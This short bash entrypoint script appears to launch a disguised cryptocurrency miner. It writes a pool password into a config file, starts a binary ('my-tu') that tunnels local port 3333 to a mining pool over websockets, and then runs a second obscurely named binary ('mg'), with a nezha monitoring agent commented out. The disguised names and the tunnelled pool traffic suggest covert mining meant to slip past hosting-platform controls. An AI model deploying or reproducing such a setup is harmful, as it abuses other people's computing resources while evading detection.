#!/bin/bash

sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /app/config.json

/my-tu -L 127.0.0.1:3333:${POOL_URL} ${WS_URL} &
#/my-tu -L 127.0.0.1:5000:status.wangjm.ml:7777 ${WS_URL} &

cd /app
./mg
#/nezha -s 127.0.0.1:5000 -p $NZ_KEY
